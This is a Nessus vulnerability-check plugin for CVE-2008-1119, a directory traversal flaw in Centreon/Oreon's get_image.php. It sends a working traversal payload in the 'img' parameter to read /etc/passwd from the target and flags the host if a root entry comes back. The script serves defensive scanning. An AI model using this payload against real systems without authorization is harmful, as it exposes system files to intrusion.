#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31299);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2008-1119");
  script_bugtraq_id(28022);
  script_xref(name:"milw0rm", value:"5204");
  script_xref(name:"OSVDB", value:"42549");

  script_name(english:"Centreon include/doc/get_image.php img Variable Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file with Centreon");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Centreon or Oreon, a web-based network
supervision program based on Nagios. 

The version of Centreon / Oreon installed on the remote host fails to
sanitize user-supplied input to the 'img' parameter of the
'include/doc/get_image.php' script before using it to display the
contents of a file.  Regardless of PHP's 'register_globals' setting,
an unauthenticated remote attacker can exploit this issue to view
arbitrary files on the remote host, subject to the privileges under
which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://www.centreon.com/Development/changelog-1x.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Centreon 1.4.2.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/centreon", "/oreon", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "../../../../../../../../../../etc/passwd";
  lang = "en";

  r = http_send_recv3(method:"GET", port: port,
    item:string(dir, "/include/doc/get_image.php?", 
      "lang=", lang, "&", "img=", file ) );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
